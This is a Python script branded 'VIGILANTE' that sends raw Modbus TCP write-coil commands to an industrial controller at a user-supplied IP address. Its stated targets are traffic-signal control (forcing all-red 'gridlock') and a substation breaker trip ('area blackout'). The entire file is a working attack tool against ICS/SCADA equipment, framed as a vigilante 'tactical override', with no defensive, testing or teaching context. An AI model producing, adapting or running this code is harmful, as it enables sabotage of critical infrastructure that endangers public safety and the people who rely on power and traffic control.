
# ==============================================================================
#  __      __ _____  _____  _____  _               _   _  _______  ______ 
#  \ \    / /|_   _|/ ____||_   _|| |             /\  | \ | ||__   __||  ____|
#   \ \  / /   | | | |  __   | |  | |            /  \ |  \| |   | |   | |__   
#    \ \/ /    | | | | |_ |  | |  | |           / /\ \| . ` |   | |   |  __|  
#     \  /    _| |_| |__| | _| |_ | |____      / ____ \ |\  |   | |   | |____ 
#      \/    |_____|\_____||_____||______|    /_/    \_\_| \_|   |_|   |______|
# 
#  VIGILANTE - Scutum in tenebris, ensis pro inermibus
# ==============================================================================
# Target: ICS/SCADA Override (ATCS & Power Relays) via Modbus TCP
# Environment: Core Python (Socket, Struct) - High Risk Operation
# ==============================================================================

import socket
import struct
import time
import sys

def build_modbus_payload(transaction_id, unit_id, function_code, register, value):
    """
    Constructs a raw Modbus TCP packet.
    Function Code 05 (Write Single Coil) is used to flip relays (e.g., traffic lights, breakers).
    """
    protocol_id = 0       # Modbus protocol
    length = 6            # Remaining bytes in this frame
    
    # Pack the Modbus Application Protocol (MBAP) header
    mbap_header = struct.pack('>HHH', transaction_id, protocol_id, length)
    
    # Pack the Protocol Data Unit (PDU)
    # value for ON is 0xFF00, OFF is 0x0000
    pdu = struct.pack('>BBHH', unit_id, function_code, register, value)
    
    return mbap_header + pdu

def execute_override(target_ip, port=502):
    print(f"[*] INITIATING TACTICAL OVERRIDE ON NODE: {target_ip}:{port}")
    
    # Target configurations (Simulated PLC Registers)
    # Register 10: ATCS Fail-Safe (All Red)
    # Register 25: Substation Breaker Trip
    commands = [
        {"desc": "ATCS Fail-Safe (Traffic Gridlock)", "reg": 10, "val": 0xFF00},
        {"desc": "Power Relay Trip (Area Blackout)", "reg": 25, "val": 0xFF00}
    ]
    
    try:
        # Establish TCP connection to the PLC
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        print("[*] Opening TCP socket to target infrastructure...")
        sock.connect((target_ip, port))
        print("[+] Connection established. Bypassing perimeter...")
        
        for idx, cmd in enumerate(commands):
            time.sleep(1) # Slight delay to avoid network flood drops
            print(f"[*] Executing Payload: {cmd['desc']}")
            
            # Function Code 05 = Write Single Coil
            payload = build_modbus_payload(transaction_id=idx+1, unit_id=1, 
                                           function_code=5, register=cmd['reg'], value=cmd['val'])
            
            sock.sendall(payload)
            response = sock.recv(1024)
            
            if response:
                print(f"[+] Command Acknowledged by PLC. {cmd['desc']} ENGAGED.")
            else:
                print(f"[-] No response from PLC for {cmd['desc']}. May be air-gapped.")
                
        sock.close()
        print("\n[!] OPERATION COMPLETE. TARGET AREA IS NOW DENIED TO HOSTILES.")
        
    except socket.timeout:
        print(f"[!] ERROR: Connection timed out. Target {target_ip} is unreachable or filtered.")
    except ConnectionRefusedError:
        print(f"[!] ERROR: Target {target_ip} actively refused connection. Port 502 closed.")
    except Exception as e:
        print(f"[!] FATAL ERROR: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 grid_override.py <PLC_IP_Address>")
        sys.exit(1)
        
    target = sys.argv[1]
    execute_override(target)
